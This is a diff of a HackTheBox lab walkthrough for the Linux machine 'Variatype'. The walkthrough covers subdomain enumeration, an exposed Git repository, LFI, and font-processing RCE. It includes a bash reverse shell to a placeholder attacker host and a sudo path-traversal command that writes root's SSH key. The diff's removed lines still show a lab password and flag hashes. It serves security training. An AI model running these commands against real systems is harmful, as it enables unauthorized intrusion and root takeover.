@@ -1,15 +1,23 @@
 # HackTheBox - Variatype Walkthrough
 
-## Machine Information
+## Overview
 
-  Attribute    Details
-  ------------ ------------
-  Platform     HackTheBox
-  Machine      Variatype
-  OS           Linux
-  Difficulty   Medium
+Variatype is a Linux-based HackTheBox machine that focuses on web application exploitation and privilege escalation.
 
-------------------------------------------------------------------------
+The attack starts with subdomain enumeration, leading to an exposed Git repository containing credentials. After authentication, a Local File Inclusion vulnerability in the download functionality allows reading sensitive files. The application also contains an insecure font processing workflow that can be abused to achieve Remote Code Execution.
+
+After gaining initial access as `www-data`, privilege escalation is performed by abusing a vulnerable FontForge processing flow to obtain a shell as another user. Finally, a sudo-permitted Python script is exploited to write an SSH key into the root account and gain full system access.
+
+## Skills Practiced
+
+- Subdomain Enumeration
+- Git Repository Exposure
+- Local File Inclusion (LFI)
+- File Upload Exploitation
+- Remote Code Execution (RCE)
+- CVE Exploitation
+- Linux Privilege Escalation
+- Sudo Abuse
 
 ## Disclaimer
 
@@ -20,14 +28,22 @@ used in authorized labs such as HackTheBox.
 
 # Enumeration
 
+## Port Scanning
+
+```bash
+nmap -sC -sV -p- -Pn $ip -o nmap
+```
+
+Found:
+
+    port : 22,80
+
 ## Subdomain Discovery
 
 Used `ffuf` for virtual host discovery.
 
 ``` bash
-ffuf -u http://variatype.htb/ \
--w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
--H "Host: FUZZ.variatype.htb"
+ffuf -u http://variatype.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.variatype.htb"
 ```
 
 Found:
@@ -41,10 +57,7 @@ Found:
 Directory brute force:
 
 ``` bash
-gobuster dir \
--u http://portal.variatype.htb/ \
--w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
--x php
+gobuster dir -u http://portal.variatype.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php
 ```
 
 Interesting endpoints:
@@ -61,7 +74,7 @@ Interesting endpoints:
 
 The exposed Git repository revealed credentials:
 
-    gitbot : G1tB0t_Acc3ss_2025!
+    gitbot : REDACTED
 
 ------------------------------------------------------------------------
 
@@ -120,7 +133,7 @@ Result:
 Payload:
 
 ``` bash
-bash -c 'sh -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'
+bash -c 'sh -i >& /dev/tcp/<ip>/1234 0>&1'
 ```
 
 Received shell:
@@ -164,7 +177,7 @@ This resulted in a shell as:
 cat user.txt
 ```
 
-    75d9be894de9975f22cba0845e507f64
+    REDACTED
 
 ------------------------------------------------------------------------
 
@@ -181,7 +194,7 @@ Allowed:
     (root) NOPASSWD:
     /usr/bin/python3 /opt/font-tools/install_validator.py *
 
-The script allowed writing arbitrary files through a URL.
+There is a CVE in packageIndex.download, levearaging to upload /root/.ssh/authorized_keys allowed writing arbitrary files through a URL. (CVE-2024-25082, CVE-2024-25081)
 
 Generated SSH key and hosted:
 
@@ -190,9 +203,7 @@ Generated SSH key and hosted:
 Payload executed:
 
 ``` bash
-sudo /usr/bin/python3 \
-/opt/font-tools/install_validator.py \
-"http://ATTACKER_IP:8888/%2Froot%2F.ssh%2Fauthorized_keys"
+sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://<ip>:8000/%2Froot%2F.ssh%2Fauthorized_keys"
 ```
 
 The key was written to:
@@ -206,7 +217,7 @@ The key was written to:
 Login:
 
 ``` bash
-ssh root@variatype -i rootkey
+ssh root@variatype -i id_rsa
 ```
 
 Verify:
@@ -227,7 +238,7 @@ Output:
 cat root.txt
 ```
 
-    0a5a03b7b4d5370daa24edc35aec585b
+    REDACTED
 
 ------------------------------------------------------------------------
 
